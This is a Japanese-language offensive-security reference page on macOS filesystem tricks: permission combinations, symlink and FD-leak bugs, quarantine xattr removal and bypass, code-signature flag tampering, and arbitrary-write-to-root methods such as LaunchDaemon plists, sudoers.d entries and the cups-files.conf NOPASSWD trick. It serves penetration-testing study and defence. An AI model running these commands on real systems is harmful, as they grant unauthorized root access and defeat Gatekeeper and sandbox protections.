# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory** では、3つの permission bit は通常のファイルの場合とは異なる意味を持ちます。`chmod(1)` は、directory に適用された execute bit を "**search**" と呼びます:<sup>[[2]](#references)</sup>

> `0100` ファイルの場合、owner による実行を許可します。directory の場合、owner による **search** を許可します。

- **read** - directory エントリを **enumerate** できます（名前を一覧表示できます）。
- **write** - directory 内のエントリを **create、rename、delete** できます。これはファイル自体ではなく、*containing* directory の属性である点に注意してください。親 directory に write できる限り、read や write ができないファイルでも delete できます。
- **subdirectory** を delete するには空でなければならず、そのためには内部のすべてを remove するのに十分な権限が必要です。
- directory に **sticky bit**（`S_ISVTX`、`/tmp` など）が設定されている場合、これは制限されます — POSIX では、プロセスがそのファイルを所有している、その directory を所有している、または適切な privileges を持っている場合にのみ、その中のファイルを remove または rename できると定めています。<sup>[[1]](#references)</sup>
- **execute / search** - directory を **traverse** することが **allowed** されます。pathname resolution は各 component を「その predecessor によって指定された directory 内」で探すため、path prefix 内のいずれか1つの component で **search rights** を失うと、leaf file 自体が world-readable であっても、その下にあるすべてのものが **by path** で到達不能になります。<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root が所有する file/folder を overwrite する方法**:

- path 内の親 **directory owner** の1つが user である
- path 内の親 **directory owner** の1つが **write access** を持つ **users group** である
- users **group** が **file** への **write** access を持っている

上記のいずれかの組み合わせがあると、attacker は想定されている path に **sym/hard link** を **inject** し、privileged な arbitrary write を取得できます。

### Folder root R+X special case

これは、上記の pathname-resolution rule から直接導かれます。directory が **root にのみ R+X を許可**している場合、内部のファイルは他のすべてのユーザーから *by path* で到達不能になります — ただし、**files' own permission bits** は permissive なままの場合があります。妨げとなっているのは directory だけです。

したがって、ファイルをその directory の**外へ移動**させることができる primitive — attacker が選択した path を、あなたが **traverse** できる location へ **moves/renames/copies** する privileged process — は、ファイル自身の mode を defeat する必要なく、arbitrary read へと変わります:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
権限の低いユーザーからソースパスを受け取る、特権ファイル移動処理（installer、log rotator、crash/diagnostic collector、backup、「export」機能）を探します。

## Symbolic Link / Hard Link

### 制限の緩いファイル／フォルダー

特権プロセスが、**権限の低いユーザー**によって**制御可能**な、または権限の低いユーザーによって**事前に作成された可能性がある** **file** にデータを書き込んでいる場合。そのユーザーは、Symbolic または Hard link を使って、そのファイルを別のファイルに**向ける**だけで、特権プロセスにそのファイルへ書き込ませることができます。

攻撃者が**任意の書き込みを悪用して権限を昇格**できる可能性については、他のセクションを確認してください。

### `O_NOFOLLOW` を使用した Open

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) によると、*「`O_NOFOLLOW` が mask で使用され、`open()` に渡された target file が symbolic link の場合、`open()` は失敗する」* とされています。ただし、チェックされるのは**最後の** component だけです。すべての**中間** component は引き続き解決され、follow されます。そのため、`O_NOFOLLOW` で書き込みを「保護」した開発者でも、target path の**親ディレクトリ**のいずれかに symlink を仕掛けることで攻撃される可能性があります。<sup>[[3]](#references)</sup>

同じ man page には、この問題を実際に解消する flags が記載されています。<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *「... `open()` に渡された path のいずれかの component が symbolic link の場合、`open()` は失敗する」*
- **`O_RESOLVE_BENEATH`** — *「... 指定された path の解決が fd に関連付けられたディレクトリの外へ出る場合、`openat()` は失敗する」*

それ以外では、すでに検証済みの directory FD を基準にした `openat()`、または `realpath()` と再検証が、パスの途中で発生する symlink swap を防ぐために残された方法です。

## .fileloc

**`.fileloc`** 拡張子のファイルは、他の applications または binaries を指すことができるため、それらを開くと、その application または binary が実行されます。\
例:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

`open` の呼び出しにフラグ `O_CLOEXEC` がない場合、file descriptor は child process に継承されます。そのため、privileged process が privileged file を開き、attacker が制御する process を実行すると、attacker は **privileged file に対する FD を継承**します。

典型的な例は、**OS X 10.10 の `DYLD_PRINT_TO_FILE` LPE** です（[SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html))：<sup>[[4]](#references)</sup>

- `dyld` は、**restricted (suid root) binaries** 内でも `DYLD_PRINT_TO_FILE=/path` を受け入れていました。これは、その特定の variable が `processDyldEnvironmentVariable()` の外部で解析されていたためです。
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` を実行するため、**任意の path に root-owned file を作成**できました。
- FD は**一度も close されず、close-on-exec flag もなかった**ため、suid binary のすべての child は **root-owned file への writable FD** を継承しました。
- たとえば `DYLD_PRINT_TO_FILE=/etc/target suid_binary` を実行し、child で継承された FD number を読み取ると、任意の root-owned writes が可能になりました。さらに `fcntl(fd, F_SETFL, 0)` によって `O_APPEND` も解除でき、追記ではなく上書きが可能でした。

同じ構造は、privileged process が、あなたが制御するものを `exec` する**前に** file を開く場合にも現れます（helper tools、`$EDITOR` 経由で呼び出される `crontab` 型の editors、env-var path から開かれる log/debug files など）。継承した FD は、次の方法で列挙できます：
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` を超える、ユーザー自身では開けないファイルを指すものは、任意書き込み（または任意読み取り）プリミティブです。

## quarantine xattrs tricks の回避

### 削除する
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

ファイル／フォルダにこの immutable 属性が設定されている場合、そのファイル／フォルダに xattr を設定することはできません
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattrをサポートしないファイルシステム

macOSがマウントできるすべてのファイルシステムが、**extended attributes**をネイティブに保存できるわけではありません。HFS+とAPFSは対応していますが、**FAT32、exFAT、（大半の）NFSマウントは対応していません**。その場合、macOSは`._<filename>`という名前の**AppleDouble**サイドファイルを書き込むことでエミュレートします（[The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)）。<sup>[[5]](#references)</sup>

これはquarantineにとって重要です。xattrが同じボリュームから実際に書き込め、**読み戻せる**場合にのみ存続するためです：
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
ボリュームが後で `._` companion を無視するパスから読み取られる場合（または companion が削除・除去された場合）、ファイルは**quarantine flag なし**で到着します。そして、quarantine が設定されていない `.app` であれば、[macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) で説明されているように、App Sandbox を脱出するには十分です。

### writeextattr ACL

この ACL は、ファイルへの `xattrs` の追加を防ぎます
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file formatは、ACEを含むファイルをコピーします。

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)では、**`com.apple.acl.text`**というxattr内に保存されたACLのテキスト表現が、decompressed fileのACLとして設定されることを確認できます。そのため、他のxattrが書き込まれるのを防ぐACLを設定した**AppleDouble** file formatでapplicationをzip fileに圧縮すると、quarantine xattrがapplicationに設定されませんでした。

詳細については[**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を確認してください。<sup>[[6]](#references)</sup>

これを再現するには、まず正しいacl stringを取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（これが機能する場合でも、sandbox は先に quarantine xattr を書き込みます）

本当に必要ではありませんが、念のため残しておきます：


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## 署名チェックの Bypass

### platform binaries のチェックを Bypass

一部のセキュリティチェックでは、XPC service への接続を許可するためなどに、binary が **platform binary** かどうかを確認します。しかし、https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ の bypass で示されているように、platform binary（`/bin/ls` など）を取得し、環境変数 `DYLD_INSERT_LIBRARIES` を使用して dyld 経由で exploit を inject することで、このチェックを Bypass できます。<sup>[[7]](#references)</sup>

### flags `CS_REQUIRE_LV` と `CS_FORCED_LV` を Bypass

実行中の binary が、次のような code によって自身の flags を変更し、チェックを Bypass することが可能です：<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures の Bypass

Bundles には **`_CodeSignature/CodeResources`** ファイルが含まれており、**bundle** 内のすべての **file** の **hash** が格納されています。なお、CodeResources の hash も **executable** に **embedded** されているため、これも変更することはできません。

ただし、signature がチェックされないファイルもいくつかあります。これらのファイルには plist 内で `omit` key が指定されています。例:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLIからリソースの署名を計算できます：
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmgのマウント

ユーザーは、既存のフォルダの上にもカスタムdmgをマウントできます。以下は、カスタムコンテンツを含むカスタムdmgパッケージを作成する方法です:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常、macOS は `/usr/libexec/diskarbitrationd` によって提供される `com.apple.DiskArbitrarion.diskarbitrariond` Mach service と通信してディスクを mount します。LaunchDaemons の plist ファイルにパラメータ `-d` を追加して再起動すると、ログが `/var/log/diskarbitrationd.log` に保存されます。\
ただし、`hdik` や `hdiutil` などの tools を使用して、`com.apple.driver.DiskImages` kext と直接通信することも可能です。

## 任意の書き込み

### Periodic sh scripts

スクリプトが **shell script** として解釈される場合、毎日実行される **`/etc/periodic/daily/999.local`** shell script を上書きできます。

**`sudo periodic daily`** を使用して、このスクリプトの実行を **fake** できます。

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** のような任意の **LaunchDaemon** を、次のように任意の script を実行する plist として書き込みます。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` に、root として実行したい **commands** を記述して生成してください。

### Sudoers File

**arbitrary write** が可能な場合、フォルダ **`/etc/sudoers.d/`** 内に、自分へ **sudo** 権限を付与するファイルを作成できます。

### PATH files

ファイル **`/etc/paths`** は、PATH 環境変数を設定する主要な場所の 1 つです。上書きするには root 権限が必要ですが、**privileged process** の script が **full path** なしで **command** を実行している場合、このファイルを変更して **hijack** できる可能性があります。

**`/etc/paths.d`** にファイルを書き込んで、PATH 環境変数に新しいフォルダを読み込ませることもできます。

### cups-files.conf

この technique は [この writeup](https://www.kandji.io/blog/macos-audit-story-part1) で使用されています。<sup>[[8]](#references)</sup>

次の内容でファイル `/etc/cups/cups-files.conf` を作成します:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
これにより、パーミッションが 777 に設定されたファイル `/etc/sudoers.d/lpe` が作成されます。末尾にある余分な文字列は、エラーログの作成をトリガーするためのものです。

次に、特権をエスカレートするために必要な設定（`%staff ALL=(ALL) NOPASSWD:ALL` など）を `/etc/sudoers.d/lpe` に書き込みます。

その後、`/etc/cups/cups-files.conf` を再度変更し、`LogFilePerm 700` を指定します。これにより、`cupsctl` を呼び出した際に新しい sudoers ファイルが有効になります。

### Sandbox Escape

FS arbitrary write によって macOS sandbox から脱出することが可能です。いくつかの例については [macOS Auto Start](../../../../macos-auto-start-locations.md) のページを確認してください。一般的な方法の 1 つは、起動時にコマンドを実行する Terminal preferences ファイルを `~/Library/Preferences/com.apple.Terminal.plist` に書き込み、`open` を使って呼び出すことです。

## 他のユーザーとして書き込み可能なファイルを生成する

非常に一般的な privesc primitive は、**自分が制御するディレクトリ内に特権プロセスでファイルを作成させ**、そのファイルへの**書き込みアクセス**を保持することです。必要な要素は 2 つあります。

1. 自分が所有するディレクトリ（または **inheritable ACL** を設定できるディレクトリ）。これにより、内部に作成されたものが自分の権限を継承します。
2. ファイルを**どこに**作成するかを指定できる特権のある/`suid` プロセス。通常は、debug/logging environment variable、config file、または helper の XPC API を介して指定します。

作成されたファイルが別のユーザーによって所有されているにもかかわらず、自分による書き込みを可能にするのが **inheritable ACL** です。`file_inherit` / `directory_inherit` の継承フラグについては、[`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) に記載されています。<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
これで、特権プロセスが `$DIRNAME` 内に作成するファイルはすべて、**あなたが書き込み可能**になります。そのディレクトリが、後で **root として実行される**場所（`/etc/periodic/*`、`/etc/cron.d`、`/etc/sudoers.d`、LaunchDaemon のディレクトリなど）でもある場合、これは直接的な root escalation につながります。ファイルを取得した後に何を書き込むかについては、上記の [Sudoers File](#sudoers-file) および [cups-files.conf](#cups-filesconf) セクションを参照してください。

「環境変数によって root プロセスにファイルを作成させ、その FD があなたに leak する」チェーンの完全な実例については、上記の [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) を参照してください。

## POSIX共有メモリ

**POSIX共有メモリ**を使用すると、POSIX準拠のオペレーティングシステム上のプロセスが共通のメモリ領域にアクセスできるため、他のプロセス間通信方式と比較して、より高速な通信が可能になります。これは、`shm_open()` で共有メモリオブジェクトを作成または開き、`ftruncate()` でサイズを設定し、`mmap()` を使用してプロセスのアドレス空間にマッピングすることで実現します。プロセスは、このメモリ領域を直接読み書きできます。同時アクセスを管理し、データ破損を防ぐために、mutex や semaphore などの同期メカニズムがよく使用されます。最後に、プロセスは `munmap()` と `close()` で共有メモリのマッピングを解除して閉じ、必要に応じて `shm_unlink()` でメモリオブジェクトを削除します。この仕組みは、複数のプロセスが共有データに迅速にアクセスする必要がある環境で、効率的かつ高速な IPC を実現するのに特に効果的です。

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Consumer Code Example</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** は、ユーザーアプリケーションにおける **file descriptor operations** の安全性と信頼性を高めるために macOS に導入された security feature です。これらの guarded descriptors により、file descriptor に特定の制限、つまり「guards」を関連付けることができ、kernel によって強制されます。

この feature は、**unauthorized file access** や **race conditions** など、特定の種類の security vulnerabilities を防止するのに特に役立ちます。これらの vulnerabilities は、たとえばある thread が file description にアクセスし、**another vulnerable thread access over it** を与えてしまう場合や、file descriptor が vulnerable child process に **inherited** される場合に発生します。この機能に関連する functions には、次のものがあります。

- `guarded_open_np`: guard 付きで file descriptor を開く
- `guarded_close_np`: file descriptor を閉じる
- `change_fdguard_np`: descriptor の guard flags を変更する（guard protection を削除することも可能）

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: the diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
